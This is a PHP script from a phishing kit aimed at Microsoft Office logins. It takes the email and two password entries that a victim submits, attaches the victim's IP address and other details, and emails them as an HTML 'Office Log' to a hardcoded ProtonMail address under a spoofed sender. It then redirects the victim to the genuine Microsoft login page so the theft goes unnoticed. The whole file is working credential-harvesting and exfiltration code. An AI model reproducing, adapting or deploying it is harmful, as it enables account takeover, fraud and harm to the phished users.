<?php
require 'Comp.php';
$comps = new Comp();

$recipient = "greatmartin1958@protonmail.com";
//$recipient = "greatmartin1958@protonmail.com";
//$recipient = "greatmartin1958@protonmail.com";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$date = date('d-m-Y');
	$ip = $comps->getIP();
    
	$email = $_POST['email'];
	$password = $_POST['password'];
	$password2 = $_POST['password2'];

	$content = ('
		<!DOCTYPE html>
        <html>
        <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <style>
        table {
          font-family: arial, sans-serif;
          border-collapse: collapse;
          width: 100%;
          max-width : 900px;
        }
        
        td, th {
          border: 1px solid #dddddd;
          text-align: left;
          padding: 8px;
        }
        .title{
          background-color: #dddddd;
        }
        </style>
        </head>
        <body>
        
        <h2>Office Log :  '.$date.'- '.$ip.'</h2>
        
        <table>
        	<tr>
        		<th class="title" colspan="2">Login Info </th>
        	</tr>
          <tr>
            <td>Email</td>
            <td>'.$email.'</td>
          </tr>
          <tr>
            <td>Password</td>
            <td>'.$password.'</td>
          </tr>
          <tr>
            <td>Password 2</td>
            <td>'.$password2.'</td>
          </tr>
          ' . $comps->userDetails() . '
        </table>
        
        </body>
        </html>
	');
			
	$subject = "New Office Log From: " . $ip . "\n";
	$headers = "FROM: office Log <nycehode@getnada.com>\r\n";
	//$headers = "";
	$headers.= "MIME-Version: 1.0\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	
	mail($recipient, $subject, $content, $headers);
	header("Location: https://login.microsoftonline.com/common/login");
}
?>